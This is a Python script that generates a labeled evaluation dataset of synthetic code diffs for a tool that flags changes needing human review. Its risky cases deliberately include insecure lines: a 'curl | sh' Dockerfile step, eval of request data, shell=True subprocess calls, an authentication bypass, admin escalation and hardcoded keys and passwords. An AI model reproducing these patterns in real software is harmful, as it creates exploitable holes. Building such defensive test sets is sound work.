"""Generate eval/dataset.json — labeled changes with the ground-truth 'should a
human be involved?' flag. Includes deliberate blind spots so the eval is honest.

Run:  python eval/build_dataset.py
"""
import json
import os

OUT = os.path.join(os.path.dirname(__file__), "dataset.json")


def diff(files):
    parts = []
    for f in files:
        path = f["path"]
        parts.append(f"diff --git a/{path} b/{path}")
        if f.get("deleted"):
            parts.append("deleted file mode 100644")
        parts.append(f"--- a/{path}")
        parts.append("+++ /dev/null" if f.get("deleted") else f"+++ b/{path}")
        for line in f.get("remove", []):
            parts.append("-" + line)
        for line in f.get("add", []):
            parts.append("+" + line)
    return "\n".join(parts) + "\n"


E = []


def add(id, expected_flag, note, files):
    E.append({"id": id, "expected_flag": expected_flag, "note": note,
              "diff": diff(files)})


# ---- safe (expected_flag = False) ----
add("docs-readme", False, "plain docs",
    [{"path": "README.md", "add": ["Updated docs."]}])
add("add-fn-with-test", False, "new function + its test",
    [{"path": "src/utils.py", "add": ["def f(x):", "    return x * 2"]},
     {"path": "tests/test_utils.py", "add": ["def test_f():", "    assert f(2) == 4"]}])
add("refactor-with-test", False, "small refactor covered by a test",
    [{"path": "src/format.py", "remove": ["    return '$' + str(x)"],
      "add": ["    return f'${x:.2f}'"]},
     {"path": "tests/test_format.py", "add": ["def test_money(): assert money(5) == '$5.00'"]}])
add("add-comment", False, "comment only",
    [{"path": "src/app.py", "add": ["# clarify behaviour"]}])
add("version-bump", False, "version bump in config file",
    [{"path": "pyproject.toml", "remove": ["version = \"1.1.0\""],
      "add": ["version = \"1.2.0\""]}])
add("test-file-named-payment", False, "OVER-FLAG: test file mentions payment",
    [{"path": "tests/test_payment.py", "add": ["def test_charge(): assert charge(0) == 0"]}])
add("security-doc", False, "OVER-FLAG: a security *doc*, harmless",
    [{"path": "docs/security.md", "add": ["Document our security practices."]}])

# ---- risky (expected_flag = True) ----
add("leaked-openai-key", True, "hardcoded secret",
    [{"path": "config/settings.py", "add": ["API_KEY = \"sk-abcd1234efgh5678ijklmnop\""]}])
add("leaked-aws-key", True, "hardcoded AWS key",
    [{"path": "src/cloud.py", "add": ["AWS = \"AKIAIOSFODNN7EXAMPLE\""]}])
add("auth-change", True, "edits authentication",
    [{"path": "src/auth/login.py", "remove": ["    return verify(token)"],
      "add": ["    return True"]}])
add("payment-change", True, "edits payment logic",
    [{"path": "src/payment/charge.py", "add": ["    gateway.charge(card, amt * 1.0)"]}])
add("delete-migration", True, "deletes a DB migration",
    [{"path": "db/migrations/0007.sql", "deleted": True, "remove": ["CREATE INDEX idx ON users(email);"]}])
add("dockerfile-pipe-sh", True, "edits infra / Dockerfile",
    [{"path": "Dockerfile", "add": ["RUN curl http://x | sh"]}])
add("env-secret", True, "edits a deploy .env",
    [{"path": "deploy/.env", "add": ["DB_PASSWORD=plaintext"]}])
add("huge-change", True, "very large blast radius",
    [{"path": "src/engine.py", "add": [f"    step_{i}()" for i in range(90)]}])
add("privilege-escalation", True, "BLIND SPOT: sets is_admin, no keyword",
    [{"path": "src/api/orders.py", "add": ["    user.is_admin = True"]}])
add("eval-injection", True, "BLIND SPOT: eval(user input)",
    [{"path": "src/handlers/parse.py", "add": ["    return eval(request.data)"]}])
add("shell-injection", True, "BLIND SPOT: shell=True with user cmd",
    [{"path": "src/jobs/run.py", "add": ["    subprocess.run(cmd, shell=True)"]}])
add("delete-tests", True, "removes a test file",
    [{"path": "tests/test_core.py", "deleted": True, "remove": ["def test_x(): ..."]}])
add("password-literal", True, "hardcoded password",
    [{"path": "src/db.py", "add": ["password = \"S3cretPassw0rd!\""]}])


if __name__ == "__main__":
    json.dump(E, open(OUT, "w", encoding="utf-8"), indent=2)
    print(f"wrote {len(E)} labeled cases -> {OUT}")
